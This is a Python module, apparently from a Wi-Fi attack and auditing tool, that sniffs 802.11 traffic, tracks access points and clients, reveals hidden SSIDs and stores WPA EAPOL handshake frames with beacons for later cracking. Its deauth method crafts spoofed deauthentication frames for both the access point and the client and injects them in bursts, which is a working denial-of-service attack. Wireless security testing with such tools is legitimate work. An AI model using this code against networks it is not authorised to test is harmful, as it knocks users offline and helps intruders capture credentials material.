import asyncio
import logging
import time
from typing import List, Optional, Callable, Any, Dict

from wifit3.engine.models import AccessPoint, Client, Handshake

logger = logging.getLogger(__name__)

class WlanInterface:
    """
    High-level 802.11 abstraction for a hardware driver.
    The UI interacts exclusively with this class.
    """
    def __init__(self, driver_instance: Any, name: str, description: str):
        self.driver = driver_instance
        self.name = name
        self.description = description
        self.current_channel = 1
        
        self.access_points: Dict[str, AccessPoint] = {}
        self.clients: Dict[str, Client] = {}
        
        self._rx_callbacks: List[Callable[[bytes, int, float], None]] = []
        self._hopping_task: Optional[asyncio.Task] = None
        self._is_hopping = False
        
        if hasattr(self.driver, 'register_rx_callback'):
            self.driver.register_rx_callback(self._on_frame_parsed)

    def _on_frame_parsed(self, parsed: dict):
        """
        Mutator callback. Receives a flat dictionary from the hardware driver
        and updates the AccessPoint registry.
        """
        frame_type = parsed.get("type")
        bssid = parsed.get("bssid")
        
        if not bssid or bssid == "Unknown" or bssid == "ff:ff:ff:ff:ff:ff":
            return
            
        rssi = parsed.get("rssi", -100)
        
        # We primarily build APs from beacons and probe responses
        if frame_type in ("beacon", "probe_resp"):
            ssid = parsed.get("ssid")
            channel = parsed.get("channel", self.current_channel)
            enc = parsed.get("encryption", "OPEN")
            
            if bssid not in self.access_points:
                self.access_points[bssid] = AccessPoint(
                    bssid=bssid,
                    ssid=ssid if ssid != "<hidden>" else None,
                    channel=channel,
                    signal=rssi,
                    encryption=enc,
                    beacons=1 if frame_type == "beacon" else 0
                )
                if ssid and ssid != "<hidden>":
                    logger.info(f"[NEW AP] Found '{ssid}' ({bssid}) on CH {channel}")
            else:
                ap = self.access_points[bssid]
                if frame_type == "beacon":
                    ap.beacons += 1
                
                # Update SSID if it was hidden and we now see it (DECLOAKING via Probe Response)
                if ssid and ssid != "<hidden>":
                    if not ap.ssid or ap.ssid == "<hidden>":
                        logger.info(f"DECLOAKED: {bssid} -> {ssid} via Probe Response")
                    ap.ssid = ssid
                
                # Smooth RSSI (simple average for now, could use EMA)
                ap.signal = (ap.signal + rssi) // 2
                
                # Update channel if it shifted
                ap.channel = channel
                ap.encryption = enc

        # Client Tracking
        if frame_type in ("probe_req", "assoc_req", "data", "eapol", "deauth", "assoc_resp"):
            client_mac = None
            source = parsed.get("source")
            dest = parsed.get("dest")
            
            if frame_type == "probe_req":
                client_mac = source
            else:
                # Deduce client MAC (the one that isn't the BSSID)
                if source and source != bssid: client_mac = source
                elif dest and dest != bssid: client_mac = dest
            
            if client_mac and client_mac != "ff:ff:ff:ff:ff:ff":
                if client_mac not in self.clients:
                    self.clients[client_mac] = Client(mac=client_mac, signal=rssi)
                client = self.clients[client_mac]
                client.signal = (client.signal + rssi) // 2
                client.packets += 1
                
                # Track association
                if frame_type in ("assoc_req", "data", "eapol"):
                    if bssid: client.bssid = bssid
                    
                # Track probed SSIDs
                if frame_type == "probe_req":
                    ssid = parsed.get("ssid")
                    if ssid and ssid != "<hidden>":
                        client.probed_ssids.add(ssid)
                        
                # Decloak via Assoc Req
                if frame_type == "assoc_req" and bssid in self.access_points:
                    ssid = parsed.get("ssid")
                    if ssid and ssid != "<hidden>":
                        ap = self.access_points[bssid]
                        if not ap.ssid or ap.ssid == "<hidden>":
                            ap.ssid = ssid
                            logger.info(f"DECLOAKED: {bssid} -> {ssid} via Assoc Req from {client_mac}")

        # Handshake tracking
        if frame_type == "eapol" and bssid in self.access_points:
            client_mac = parsed.get("source") if parsed.get("dest") == bssid else parsed.get("dest")
            if client_mac:
                ap = self.access_points[bssid]
                if not ap.handshake or ap.handshake.client_mac != client_mac:
                    ap.handshake = Handshake(bssid=bssid, client_mac=client_mac)
                
                raw_frame = parsed.get("raw")
                replay = parsed.get("eapol_replay_counter")
                if replay and raw_frame:
                    replay_hex = replay.hex()
                    frames = ap.handshake.eapol_frames_by_replay.setdefault(replay_hex, [])
                    # Simple deduplication
                    if raw_frame not in frames:
                        frames.append(raw_frame)
                        logger.info(f"[EAPOL] Saved frame for {bssid} <-> {client_mac} (Replay: {replay_hex})")

        # Beacon handling (ensure beacon frame is saved for handshake)
        if frame_type == "beacon" and bssid in self.access_points:
            ap = self.access_points[bssid]
            if ap.handshake and not ap.handshake.beacon_frame:
                ap.handshake.beacon_frame = parsed.get("raw")

    def get_access_points(self) -> List[AccessPoint]:
        """Returns a list of discovered Access Points."""
        return list(self.access_points.values())

    async def connect(self):
        """Initializes the underlying hardware handshake."""
        await self.driver.connect()

    async def set_channel(self, channel: int) -> bool:
        """Translates a channel number into the driver's register sequences."""
        success = await self.driver.set_channel(channel)
        if success:
            self.current_channel = channel
        return success

    def register_rx_callback(self, callback_func: Callable[[bytes, int, float], None]):
        """
        UI registers a function here. 
        Expected signature: func(frame_bytes, rssi, timestamp)
        """
        if callback_func not in self._rx_callbacks:
            self._rx_callbacks.append(callback_func)

    def _fire_rx_callbacks(self, frame_bytes: bytes, rssi: int):
        ts = time.time()
        for cb in self._rx_callbacks:
            try:
                cb(frame_bytes, rssi, ts)
            except Exception as e:
                logger.error(f"RX Callback failed: {e}")

    async def send_raw(self, frame_bytes: bytes, use_no_ack: bool = True) -> bool:
        """
        Injects a raw 802.11 frame.
        The underlying driver is responsible for wrapping it in the correct
        hardware descriptors (e.g., ath_tx_status) before sending.
        """
        if hasattr(self.driver, 'inject_frame'):
             return await self.driver.inject_frame(frame_bytes, use_no_ack)
        logger.warning(f"Driver for {self.name} does not support injection.")
        return False
    
    async def deauth(self, ap_bssid: str, client_bssid: str, burst_count: int = 50):
        """
        Sends a burst of Deauthentication frames to the AP and the Client.
        """
        ap_bssid = ap_bssid.lower()
        client_bssid = client_bssid.lower()
        
        # 1. Get the target channel
        target_chan = self.current_channel
        if ap_bssid in self.access_points:
            target_chan = self.access_points[ap_bssid].channel
            print(f"[DEAUTH] Found AP {ap_bssid} on channel {target_chan}.")
        else:
            print(f"[DEAUTH] AP {ap_bssid} not in registry. Defaulting to channel {target_chan}.")

        import struct
        
        def _str_to_mac(mac_str: str) -> bytes:
            return bytes(int(x, 16) for x in mac_str.split(':'))
            
        ap_mac = _str_to_mac(ap_bssid)
        cl_mac = _str_to_mac(client_bssid)
        
        # Frame Control: 0xC0 (Deauth, Mgmt), Flags: 0x00
        # Duration: 0x0000 (Let hardware fill if needed, or leave 0)
        # Reason Code: 7 (Class 3 frame received from nonassociated STA)
        fc_dur = b'\xc0\x00\x00\x00'
        reason = struct.pack("<H", 7)
        seq = b'\x00\x00' # Hardware usually overwrites seq
        
        # 1. Deauth the Client (Spoofing the AP)
        # Addr1=Dest(Client), Addr2=Source(AP), Addr3=BSSID(AP)
        client_deauth = fc_dur + cl_mac + ap_mac + ap_mac + seq + reason
        
        # 2. Deauth the AP (Spoofing the Client)
        # Addr1=Dest(AP), Addr2=Source(Client), Addr3=BSSID(AP)
        ap_deauth = fc_dur + ap_mac + cl_mac + ap_mac + seq + reason
        
        logger.info(f"Injecting Deauth Burst ({burst_count}x) on CH {target_chan}: {ap_bssid} <-> {client_bssid}")
        
        # Inject the frames using the hardware driver
        # We use use_no_ack=True for "fire and forget". We are spoofing, 
        # so ACKs will go to the real targets and cause endless hardware retries for us!
        for i in range(burst_count):
            await self.send_raw(client_deauth, use_no_ack=True)
            await self.send_raw(ap_deauth, use_no_ack=True)
            time.sleep(0.01)
            

    async def start_hopping(self, channels: List[int] = None, interval: float = 0.5):
        """Spawns an asyncio task to loop through channels."""
        if self._is_hopping:
            return
            
        if not channels:
            # Default 2.4GHz hopper.
            # TODO Rely on self.driver.supported_channels instead (once ready)
            channels = [1, 6, 11, 2, 7, 12, 3, 8, 13, 4, 9, 5, 10]
            
        self._is_hopping = True
        self._hopping_task = asyncio.create_task(self._hop_loop(channels, interval))
        logger.info(f"Started channel hopping on {self.name}")

    async def _hop_loop(self, channels: List[int], interval: float):
        import itertools
        channel_cycle = itertools.cycle(channels)
        
        while self._is_hopping:
            channel = next(channel_cycle)
            await self.set_channel(channel)
            await asyncio.sleep(interval)

    async def stop_hopping(self):
        """Cancels the hopping task."""
        self._is_hopping = False
        if self._hopping_task:
            self._hopping_task.cancel()
            try:
                await self._hopping_task
            except asyncio.CancelledError:
                pass
            self._hopping_task = None
        logger.info(f"Stopped channel hopping on {self.name}")

    async def close(self):
        """Halts the driver loops and releases the USB interface."""
        await self.stop_hopping()
        await self.driver.close()